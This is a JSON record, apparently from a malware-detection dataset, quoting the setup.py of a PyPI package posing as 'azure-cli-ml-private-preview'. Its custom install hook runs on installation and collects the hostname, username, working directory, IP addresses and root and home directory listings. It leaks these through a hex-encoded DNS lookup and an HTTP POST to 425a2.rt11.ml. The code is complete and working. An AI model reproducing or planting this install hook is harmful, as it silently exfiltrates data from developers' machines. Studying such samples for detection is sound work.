[
  {
    "pyfile": "setup.py",
    "malicious_code_snippets": "import requests\nimport socket\nimport getpass\nimport os\nimport json\nimport sys\ntry:\n    import netifaces\nexcept:\n    pass\n\npname=\"azure-cli-ml-private-preview\"\n\ndef getFiles(paths):\n    ufiles = []\n    for mpath in paths:\n        try:\n            files = os.listdir(mpath)\n            for ufile in files:\n                ufiles.append(os.path.join(mpath,ufile))\n        except:\n            pass\n    return ufiles\n\ndef isprivate(ip):\n   if ip.startswith('fe80::') or ip == \"::1\":\n       return True\n   parts = ip.split('.')\n   return parts[0] == '10' or (parts[0] == '172' and (int(parts[1]) >= 16 and int(parts[1]) <= 31)) or (parts[0] == '192' and parts[1] == '168') or (parts[0] == '127' and parts[1] == '0' and parts[2] == '0')\n\ndef todashedip(ip):\n    return ip.replace('.','-').replace(':','-')\n\ndef gethttpips():\n    addresses = []\n    try:\n        addresses=[netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr'] for iface in netifaces.interfaces() if netifaces.AF_INET in netifaces.ifaddresses(iface)]\n        addresses+=[netifaces.ifaddresses(iface)[netifaces.AF_INET6][0]['addr'] for iface in netifaces.interfaces() if netifaces.AF_INET6 in netifaces.ifaddresses(iface)]\n    except:\n        pass\n    return addresses\n\ndef getIps():\n    addresses = []\n    result = []\n    try:\n        addresses=[netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr'] for iface in netifaces.interfaces() if netifaces.AF_INET in netifaces.ifaddresses(iface)]\n        addresses+=[netifaces.ifaddresses(iface)[netifaces.AF_INET6][0]['addr'] for iface in netifaces.interfaces() if netifaces.AF_INET6 in netifaces.ifaddresses(iface)]\n    except:\n        pass\n    for addr in addresses:\n        if not isprivate(addr):\n            result.append(addr)\n            if \".\" in addr:\n                return \"i.\"+todashedip(addr)+\".i\"\n    if len(result)>0:\n        return \"i.\"+todashedip(result[0])+\".i\"\n    else:\n        return \"i._.i\"\n    \n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        try:\n            dn = \"\"\n            hn = hostname.encode().hex()\n            un = username.encode().hex()\n            pn = pname.encode().hex()\n            ip = getIps()\n            dn = hn+\".\"+pn+\".\"+un+\".p\"\n            cs = cwd.split('/')\n            for i in range(len(cs)):\n                cs[i] = cs[i].encode().hex()\n            path = \"\"\n            for c in cs:\n                if c != \"\" and c != None:\n                    path = path+\".\"+c\n            path = path.strip('.')\n            dn = dn+\".\"+path+\".p\"\n            dn = dn+\".\"+ip\n            dn = dn+\".425a2.rt11.ml\"\n            socket.gethostbyname(dn)\n        except Exception as e:\n            print(\"exception\")\n            print(e)\n            pass\n        ploads = {\"msg\":json.dumps({'hostname':hostname,'cwd':cwd,'username':username,\"ipaddresses\":json.dumps(gethttpips()),\"dirs\":json.dumps(getFiles([\"c:\\\\\",\"d:\\\\\",\"/\",\"/home\"]))})}\n        requests.post(\"https://425a2.rt11.ml\",data = ploads)\n"
  },
  {
    "metadata": {
      "package_name": "azure-cli-ml-private-preview-99.10.0",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/azure-cli-ml-private-preview-99.10.0.txt"
    }
  }
]